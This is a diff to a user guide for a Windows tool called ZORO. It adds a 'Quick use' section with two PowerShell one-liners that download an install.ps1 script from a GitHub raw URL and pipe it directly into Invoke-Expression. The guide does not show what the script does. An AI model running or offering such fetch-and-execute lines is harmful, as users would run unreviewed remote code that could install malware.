@@ -11,6 +11,9 @@ This guide walks through running ZORO (v1.2.0) and using each menu. For a full f
 - Recommended first steps once the app opens: go to **[7] Backup & Restore → [1] Create a backup**, and **[6] Miscellaneous → [1] Create a System Restore Point**. Both are optional but make undoing anything trivial.
 
 ---
+## Quick use:
+  just run: irm https://raw.githubusercontent.com/zoronolonger/cwizxir/main/install.ps1 | iex
+  or :iex "& { $(iwr -useb 'https://raw.githubusercontent.com/zoronolonger/cwizxir/main/install.ps1') }"
 
 ## 2. Launching ZORO
 
